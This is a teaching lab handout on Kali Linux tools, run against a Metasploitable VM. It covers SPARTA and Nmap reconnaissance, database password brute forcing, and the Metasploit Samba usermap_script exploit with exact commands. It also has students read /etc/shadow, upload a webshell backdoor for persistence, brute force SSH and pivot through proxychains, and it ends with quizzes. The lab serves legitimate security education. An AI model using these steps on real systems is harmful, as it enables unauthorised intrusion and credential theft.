# Kali Linux

## Introduction

 This lab will give you an overview of the many tools that Kali Linux has in its toolset. The intent was for this lab to overlap as little as possible with other labs you may have completed.

Kali Linux is a Linux distribution designed for digital forensics and penetration testing. It comes with over 600 pre-installed penetration testing tools.

![1511135243432](https://dl.dropboxusercontent.com/s/gn9bei3f4npsd4b/1511135243432.png)

### Learning Objectives

After the labs, the students should be able to do the following:

- Navigate through Kali’s collection of security tools
- Perform system reconnaissance using SPARTA and Nmap Scripting Engine
- Exploit vulnerabilities using the Metasploit Framework
- Use web vulnerability scanners, such as Nikto, Skipfish, and Golismero
- Collect scan results into Dradis for reporting
- Perform brute force attacks using Medusa and Hashcat
- Pivot between hosts with Proxychains

Log into the Kali VM using username `root` and password `tartans`.

## Fun with Menus

Kali contains numerous tools that are useful in a penetration test. There is a menu on the top left of the screen that contains some of the more commonly used ones.

![img](https://lh6.googleusercontent.com/XBxTL6tmdapdvirGnnW3AC4gViiFp7b7Uz6Jrg0NaWZQXZ_ppCiS5grsiupvbbJuQSs8zxR0MO4ftktKc92R-w6atNVEnO00QoCEL2a-3Z6kTEHibabhxAB_GwCAMKi6GVoAoR_G)

**Read through the menu now and determine which category each of the following belongs to (for example: Nikto is found in the “Vulnerability Analysis” category:**

1. **sidguesser**
2. **u3-pwn**
3. **hamster**
4. **mdb-sql**
5. **volatility**
6. **sqlmap**
7. **binwalk**

## SPARTA

SPARTA is an active reconnaissance tool used for penetration testing. It can be found under the *Information Gathering* category. In this lab, we’ll be using it to scan for open ports and gain access to databases on the victim’s machine. Open it now.

Select “Add host(s) to scope” from the file menu.

![img](https://lh6.googleusercontent.com/kSRk8ZVDD3S-rNRel_qV8jtEj4Fa9iKqKW4WthLnYiUfKaNO-QtcxoSWcPTAcNgkrjsEkZ4UtSgnvZrq2o00leAA8GDinOkyfC60e3i77KgRehnd_rmfatSxhWFnV_RJU4B86HJq)

Under IP Range, enter in the IP of the Metasploitable machine, 10.0.0.13.

![img](https://lh4.googleusercontent.com/nGaNV-fG_cxoRvEiII-9YYCy3lVx8Uy_noe_efmaomNTFlfkPi8L2U2X5PqFDpHTYMfkcG2ZxIcHIC_K5HY6M_E4RLaUn2CpWvWJC1T_18wG9GUHmN6BlNlDj9RECQSzsJ0241Fe) 

Click “Add to scope”. SPARTA will start a scan immediately. Wait for it to complete. The output window will update multiple times during this process.

Under the Services tab in the right panel, you will see a list of services running on the remote machine. Note that there is an Apache web server running on port 80 -- we’ll use this later in the lab.

Scroll down the tab and right click the row for port 5432, where the PostgreSQL server is running.

PostgreSQL, colloquially referred to as Postgres, is an open-source database management system (DBMS). SPARTA contains a list of default user credentials for Postgres. Perhaps the administrator has carelessly forgotten to change the default password. Select “Check for default postgres credentials” to brute force through a list.

![img](https://dl.dropboxusercontent.com/s/l9peaveqzukst79/checkforpostgres.png)

You should see a new tab appear: “postgres-default” containing the output of the scan.
 
**Quiz: What is the connection password for the PostgreSQL instance?**

Close the postgres-default tab and return to the Services tab.

Note that MySQL is running on port 3306. MySQL is another open-source DBMS. Right-click the service and repeat the process to “Check for default MySQL credentials”.

It seems that the administrator has changed the default root password! Since the default credentials did not grant us access, we’ll have to try a dictionary attack. A dictionary attack uses a pre-compiled list of common password combinations called a wordlist. Right click on this service and select ‘Send to Brute’ to access this functionality in SPARTA.

![img](https://dl.dropboxusercontent.com/s/ctmvd84vjwhqi3n/sendtobrute.png)

Go to the Brute tab. To conduct a dictionary attack, we need a pre-compiled list of combinations. Select the radio button to the left of ‘Username’ to use the pre-entered root user. Click the ‘Browse’ button on the Password row. Use the sqlmap.txt file included with Kali Linux from */usr/share/wordlists/* as shown below:

![img](https://lh6.googleusercontent.com/oPNU5WUEXWqWRAJQbh5f1n7j_8TJudslLAIFTKoVuE8Z_fy2UG5-oNt1F6FD_lcLFWvNLo0-dlBkhWzjYvQJm_z4y-LgZ-QaKNNZAuGdbZgKNG9ilkbN7hA98zOXlR7tD-pcR3_z)

The wordlist we’re using has over a million combinations, which would take quite some time to iterate through in the worst case. Our attack should take about a minute. Run the attack now:

![img](https://lh5.googleusercontent.com/BEEDJqzkUOVpn1Pu-fHpS8VZvBRBg6ziIHlLq8h2u0jgYQn_N6wkAR6_sf-gx2kuB4kZtB9JILsVO2T6Z5dpPiTODr7nEJ0cYBYpWXMjKILDT5gqlEEGWQFLh5FdD7N7q5bzhs_H)

You will notice that a valid password was found.

**Quiz: What is the connection password for the MySQL instance?**

Return to the Scan tab and right click the 3306 service that we have just attacked. Select “Open with mysql client (as root)”.

![img](https://dl.dropboxusercontent.com/s/cvbd63ypb63d1as/openwithmysql.png)

When prompted, enter the password you discovered from the dictionary attack. We are now logged into the mysql instance. To verify your connection, you can submit a `select user();` query.

![img](https://lh5.googleusercontent.com/HOcPCbb3LV5Jpf4hgGDquwhjRN8oo5tFN_tZdc_vEefQK6LXFAINjspUPZN28WbdRM0EDDp8zDLd9ial-O8VoQhQ3nyKNakCPO2XUY5mA9JQZ6JqbxkbEf3gIibsF58fUKZfMGL1)

Go back to SPARTA and note that Samba is running on ports 139 and 445. Samba provides file and print services for Windows clients. Right click the service running on port 445. Notice the variety of options that we have available to us. For instance, we could try to extract password policies, usernames, and much more.

![img](https://lh3.googleusercontent.com/ZVca8Jpc_hCgSN3T9Tm_0Cx9rdfz_qPa3P-wkQqTidKhtBdR_8IHyxQd3woidSCj3n9eAPcBy3X_r_RrCjLzOtSqf_algtv5uM_0XkkD4yR97Bl-SO39GQJyJuSFB8mX3pbK29_o)
<div style="page-break-after: always;"></div>

## Nmap Scripting Engine (NSE)

You have no doubt had some exposure to Nmap by now. It is the de facto standard for port scanning. We are going to dive a bit deeper and look at its scripting engine. 

The Nmap Scripting Engine (NSE) allows users to write and share scripts to automate a wide variety of networking tasks. NSE is designed to be versatile, and supports tasks such as Network Discovery, Version Detection, Vulnerability Detection, Backdoor Detection, and even Vulnerability Exploitation.

Run the following command to see a list of the default scripts included:

![img](https://lh4.googleusercontent.com/oTmoNYzigfP1MTE_EkQbnMtO5MTDkLMZyyYIACsj180-Yl8potJ3B0W5EWsQ8vZj6ktvnM8JBrDrsHZlIxMtzLj3nZC453VAacIOhdb0lY10M8EC2P3wmPfmN2doDFfNGJxEBRPy)

Let’s look at a Network Discovery script. View the contents of the http-headers.nse file:

![img](https://lh5.googleusercontent.com/cHO45DfN6kFPZOgJAm23onz7LolU_tbPSGtduTqaVLdNr64ic4_HAoTHSSmaCFUCAdnpRA-Hz_eP820DuB91Q8XxPVuT_wzrQnKZsGbn-D1VgSuQhtktKvVaOsihb1F79eWOkfBw)

The scripts are written in a cross-platform scripting language called Lua. The description, author, and categories are set as metadata.

**Quiz: What sort of network request does http-headers.nse send to the server?**

1. **WTF**
2. **HEAD**
3. **GET**
4. **POST**

Sometimes servers with lax security settings will reveal server information in the response headers. Let’s run the script now on all ports, and save a copy of the results at */root/scan.xml*. We will use this results file later in the lab.

![img](https://dl.dropboxusercontent.com/s/i74y8sep54bs301/nmap%20script.png)

**Quiz: Which web server is the victim running on port 80?**

1. **Apache**
2. **Nginx**
3. **IIS**
4. **COBOL**

**Quiz: Which software powers the web server backend on port 80?**

1. **Thousands of nanochip-controlled miniature chameleons**
2. **Python-Flask**
3. **Node.js**
4. **PHP**
<div style="page-break-after: always;"></div>

## Metasploit Framework

Since we saw in SPARTA that the victim machine is running Samba version 3.0.\*, we know that it is likely vulnerable to CVE-2007-2447, which allows remote code execution. The Common Vulnerabilities and Exposures (CVE) system tracks known vulnerabilities in a way that allows analysts and researchers to easily reference them. CVEs are issued by MITRE, CERT, and software vendors. Let's use Metasploit to run this attack.

Run `msfconsole` and enter the following commands:

- Find Metasploit exploits for this CVE:
`search cve:2007-2447`
- Use the exploit you found:
`use exploit/multi/samba/usermap_script`
- Set the necessary options. In this case we need to set the Remote Host to our victim's machine:
`set rhost 10.0.0.13`
- Run the exploit:
`exploit`

![img](https://lh3.googleusercontent.com/h_VAN19i_mzdkkBVZQufJ3ZxoNr_KbhR9s9ngCWRqRPLVtoKikA_RbIWcIPlsZC6gwK81FRYuRYM4CKZ5iMToUGA4asO6uYgHmlxGNfgP4aWgddWjYXNPVH93ko1Z-9bsVF6N5Jv)

**Be sure to note the Command Shell Session number; you will need that later.**

If you see an error, you may need to re-run the exploit. Confirm that the exploit worked by running `ifconfig` and checking the IP address.

Run `whoami`.

Quiz: Which user was the service running under on the remote machine?

1. root
2. god
3. samba
4. the\_one\_who\_stole\_your\_sandwich\_im\_sorry\_but\_i\_lack\_the\_courage\_to\_tell\_you\_that\_in\_person

On UNIX systems, the shadow file contains a list of user accounts on the machine and a hash of each account’s password. Output the contents of the shadow file with the following command: `cat /etc/shadow`. This file contains hashes that can be used to crack the passwords of local users. Actually doing this is beyond the scope of this lab.

Next, run `uname -v` to learn what operating system the machine is running.

Since we now know the operating system, web server type, and back-end software, we have a pretty good idea of how and where we could upload our own web page.

We will now upgrade our shell to a Meterpreter session. This will make it easier to perform post-exploitation activities, such as upload a webshell to ensure future access to the system.

Press <kbd>Ctrl</kbd>+<kbd>Z</kbd> to suspend the shell. Enter `y` to confirm.

Use the shell\_to\_meterpreter module to upgrade your session:
```
use post/multi/manage/shell_to_meterpreter
set session <your Command Shell Session number from before>
run
```

**Note that even though the Meterpreter session has started, this session is backgrounded -- your active shell is still on the attacker machine.** Once the shell_to_meterpreter script completes, run the `sessions` command in Metasploit to list active sessions (shells, Meterpreter, remote desktop, etc.). Find the Meterpreter session you started.

Switch to it by using `sessions -i <id of meterpreter session>`. Run the command `ls /var/www` to verify that you are now accessing the Meterpreter shell on the victim's machine. Meterpreter accepts a different set of commands than the Bash shell you may be used to.

We will upload a webshell to the host to allow us to quietly maintain access to the machine. A webshell is a web page on the victim's web server that runs server-side commands on behalf of the attacker. Kali offers several webshells under */usr/share/webshells*.

![img](https://lh6.googleusercontent.com/68HED-W3f2nLv7xnVSXGbVy7XLwyQBu6IN51z0L6-7F3cUEAhPvuoYSZbYL0Z1R7RWT5g7VuHnQBQ9qz8B2-7MGJJ616VsHcQDWMUy_WiLFXIWozoOE_8h-PW03FSIQV6SXiI9vr)

This webshell takes a shell command through the form of a GET request and runs it. Let's test the webshell in our browser. Navigate to Applications > Favorites and launch Iceweasel. Open the URL http://10.0.0.13/simple-backdoor.php?cmd=whoami

Quiz: Which user was the web service running under on the remote machine?

1. root
2. god
3. www-data
4. the\_real\_slim\_shady

We are going to leave our webshell alone for now and move on to other things.

## Reporting with Dradis
### Introduction
Dradis is an extensible, open source reporting framework for generating reports which can import output from various tools.

### Lab
In this lab, we will see how Dradis create report from results of multiple scan tools

#### Launch Dradis
Start the Dradis service by running `service dradis start` as root. (If you get an error, it may mean the service is already running.)

![img](https://lh4.googleusercontent.com/wIWUYeB-9DAcsj1wyXXM07ANk0o8_swrVif3tYze6PGRaiLnVREzgo1DWEJi-Km0l9VFieamd13WXevWJYpkCqFJVhZ9oG533QMUuCWErUib-A6xrS5uszjx0tCdVRpZjFZcH8gq)

Find the dradis application under the “Reporting Tools” category in Applications and launch it:

![img](https://lh5.googleusercontent.com/gR-bWkMzavjWOR1Un78se0AWJ_ivAXl_PmY2QrnSTXtJ8jQlHV2XJqz2cHok9X-gF6Pk6ooquQ3G6xZfT_G_e_cYCvlMFoKWzUaD5u1ni94TrmYi_gazvqfwNAyseA4uIdnkTzRl) 

This will open your web browser and navigate to localhost. Type in the user name "dradis" and the password “tartans”. On the next page, you can import your data.

#### Import your Nmap result
Click on "Import from file" and select "new importer".

![img](https://dl.dropboxusercontent.com/s/ubw7rdrwhp9d50h/newimporter.png)

In the Upload Manager tab, click the “Plugins available” link. This will show you the different plugins that are available. Notice that the Nmap uploader expects an XML-formatted results file, which we created earlier.

![img](https://dl.dropboxusercontent.com/s/r5folfwcxwtteet/available%20plugins.png)

In the drop-down menu under "Upload file", select "NmapUpload" from the list. Import your Nmap results from the last exercise. They should be stored at */root/scan.xml*.

![img](https://lh6.googleusercontent.com/vyglluptc6TQ0C7COK3ovRcChapn_hhkHcN16m7f-FUd8nzkeWYOIvDz6hAUJufSG1ZebEpcLehHXZD8FRFVHcdEp0M-WA2I8dCARNSbvS2wlqdF4zBMSkIMJP5kE2GXM-kW2gMq)

Close the Upload Manager tab.

On the Dradis home page, expand the “plugin.nmap” subtree:

![img](https://lh3.googleusercontent.com/I0XzQ2Hq3og_MMjk0_zF7a9S3o_gjLeqk5aDfm0P0I2HN5jrLSjooIUaF1CbKxW0XDrkKcL7DujrfeNcG2y5iuzsJsy_7xtl3cGRqyNHI9qNi7DBymEOxZyz16r-jJHxkB6qJdnp)

You will see that the information has been imported. Using this method, you can include information from multiple scans. 

#### Import scan results from Nikto
The output of a Nikto vulnerability scan of the victim's port 80 web server has been stored at */root/nikto.xml*.

Import this file into Dradis. Select *NiktoUpload* in the dropdown list and click “browse” to select the Nikto scan result you just generated.

![img](https://lh5.googleusercontent.com/J4InaXJ0YW6RQ-4B0CnQpXvKALT29U8cuItK2RPtvq4jzRwiW93-BJAokZ4LmmufJHXOvz2-352xQUva4NQlYMuLoiVNqkIb1v8RNMscm-21FXZ3HURxPdIRPx5RTy3izy7ke1NF)

Select the Nikto scan result.

![img](https://lh4.googleusercontent.com/TIWt_VIcIYvhyrrP0ukvmtHw6K_VmZOx10HhnOTIdlLPurg14ODXiMOQKVR4t6nQkelMWWroFiu71WXug7_c6HSSzaxI1hl4ErM-Yg0JgBc9NDesw4aUF3SbCpQSDDKX6J1hKs_L)

If everything works well, yo will see the following result indicating the Nikto result has been imported into Dradis.

![img](https://lh6.googleusercontent.com/q6Edh2yLH7Ib9DuqDLqjsaFcCUtr198TmULc6u1kv2ICd0ivO6cd2ePqQ-57l35qpXUPyZN6BYsBsj4w7dK5IMMLqAQ1W0T1k5Wn5GpV8Xd8uv76tZZQJLqQEfPIC2KUbuaSjjZ-)

Now you are able to see the scan results of different tools in a centralized GUI.

![img](https://lh3.googleusercontent.com/1kdpjbR9scEls_LII7hWi2j4fYkph1jaTc09yvqItvcYH3RdN0VKxnlJWvypDdStlo3hSPN7uTks1haCZcwE2oEDgXApg0AeMDOFqRrI3yAb_WzRmHPsVmQrJO3m6ZrwoD8i2CnC)

## Web Vulnerability Scanners: Skipfish, Nikto, Golismero, etc.

Web Application Vulnerability scanners work by sending a series of requests and analyzing the results to detect vulnerable behavior. The existence of standardized labels for various known vulnerabilities, such as CVE and OSVDB, makes it possible to test for a massive number of vulnerabilities and keep track of which vulnerabilities affect a host.

### Nikto

From OWASP:

> Nikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items, including over 3500 potentially dangerous files/CGIs, versions on over 900 servers, and version specific problems on over 250 servers. Scan items and plugins are frequently updated and can be automatically updated (if desired).

Nikto is one of the simplest to use Web Vulnerability Scanners in Kali. Below, we can see the first part of a Nikto scan that was run against our target host's web server.

![1510454040741](https://dl.dropboxusercontent.com/s/07o3dy1y4h6cs80/1510454040741.png)


### Skipfish

From tools.kali.org:

> Skipfish is an active web application security reconnaissance tool. It prepares an interactive sitemap for the targeted site by carrying out a recursive crawl and dictionary-based probes. The resulting map is then annotated with the output from a number of active (but hopefully non-disruptive) security checks. The final report generated by the tool is meant to serve as a foundation for professional web application security assessments.

A simple skipfish scan can be run on our target as follows:

`skipfish -o skipfish_out http://10.0.0.13`

You will then be presented with this interface:

![1510454954298](https://dl.dropboxusercontent.com/s/okydf4c3nfwrfjq/1510454954298.png)

After pressing a key, the terminal will look like this:

![1510454988572](https://dl.dropboxusercontent.com/s/w98rur1evpfaqoh/1510454988572.png)

This scan can take a long time. Once finished, the results will be put in the directory specified by the _-o_ parameter. In this case, the output directory is *skipfish_out*.

When the scan is complete, an *index.html* page is created in *skipfish_out*. If opened in the browser, it shows this dashboard:

![1510457909910](https://dl.dropboxusercontent.com/s/m76as9s6se8do41/1510457909910.png)

If you scroll down, a list of possible issues is displayed:

![1510458029030](https://dl.dropboxusercontent.com/s/5c54ixvjf68o273/1510458029030.png)

The _Query Injection_ and _Shell Injection_ vectors represent vulnerabilities that attackers could use to execute potentially malicious behavior on the target.

### Golismero

 Golismero is a modular framework used for web application scanning. It includes modules for portscanning, web vulnerability scans, and vulnerability scans on other services. In fact, Golismero will perform Nmap and Nikto scans by default.

An example scan can be found below:

![1510454629546](https://dl.dropboxusercontent.com/s/q9az2rfp682niyu/1510454629546.png)

## Password Crackers: Hashcat, medusa, wordlists, etc

From a theoretical perspective, all brute force utilities do basically the same thing: feed a sequence of guesses into an interface. For example, a dictionary attack involves iterating through a wordlist, using each line as a password, and informing the user when the correct password has been tried, as we saw earlier.

### Wordlists

A brute force tool is only as good as the wordlist it uses. Choosing the wrong wordlist can make breaking a password infeasibly time-intensive or even impossible.

Fortunately, Kali Linux contains a great number of wordlists in the */usr/share/wordlists* directory. This directory contains wordlists for usernames, passwords, web directories, and other strings that might be useful in a brute force attack.

### Hashcat

Hashcat uses your computer's GPU to run several instances of a hashing algorithm in parallel. This makes it very fast, and a bit of a pain to demonstrate on VMs.

### Medusa

Medusa is a network brute force tool. It supports SMB,  HTTP, POP3, MS-SQL, SSHv2, and many others. Below is an example of an attack on the SSH service of our target machine.

![1510457035778](https://dl.dropboxusercontent.com/s/2a7i10uhbev10h6/medusa.png)

The -M flag specifies the module to use (In this case SSH). -P specifies the password list to use. -u specifies the user, msfadmin is the administrator of our target machine.

Generally, it is preferable to brute force a password locally to avoid the latency bottleneck involved with network requests. But when that is not possible, Medusa can be a very useful tool.

## Pivoting with Proxychains

Proxychains allows users to proxy the network traffic of a program through a HTTP, SOCKS4, or SOCKS5 proxy. This can be used to access resources that maybe not be available directly to your computer or to pivot from one network to another, if the proxy exists on both networks.

This part of the lab is non-interactive: you are not expected follow along. To demonstrate, we will set up a SOCKS proxy (some of you may recognize this machine from Martin Carlisle's Introduction to Information Security class):

![1510446342627](https://dl.dropboxusercontent.com/s/7vvrno6gbg2jnwr/proxychains1.png) 

We then need to configure proxychains to use this proxy. This is done by editing /etc/proxychains.conf

![1510446584729](https://dl.dropboxusercontent.com/s/8cgygp22gsdwhc9/proxychains2.png)

Note that our proxy is using the loopback interface (127.0.0.1) on the port specified in the previous command.

We will now tell the computer to connect back to us to prove that the connection has been proxied through the server. In this case, our IP address is 128.237.131.158 and is publicly accessible, so we can use Netcat to start a TCP connection to ourselves.

![1510445834602](https://dl.dropboxusercontent.com/s/tp3tjjglo7gwuyi/proxychains3.png)

We can see that the SOCKS proxy initiated the connection back to us.

## Kahoot Quiz
1. What is Kali? Select the best answer.  
A.  A Native American god  
B.  A collection of reconnaissance tools  
C.  A vulnerability scanner  
D.  A Linux distribution  

2. Which one is SPARTA not used for in this lab?  
A. Scanning for vulnerable services  
B. Gaining access to a database  
C. Spoofing the IP of the metasploitable machine  
D. Cracking the MySQL server password  

3. What sort of network request does http-headers.nse send to the server?  
A. POST  
B. HEAD  
C. GET  
D. DELETE  

4. True or false: Nmap Scripting Engine (NSE) can exploit vulnerabilities.  
A. True  
B. False  

5. In the Dradis section, what is the format of the files imported into Dradis?  
A. drl  
B. xml  
C. json  
D. zip  

6. Which of the above is not used to crack passwords normally?  
A. Wordlists  
B. Golismero  
C. Hashcat  
D. John the Ripper  

7. Have you learned something about Kali during this demo?  
A. Yes  
B. No  
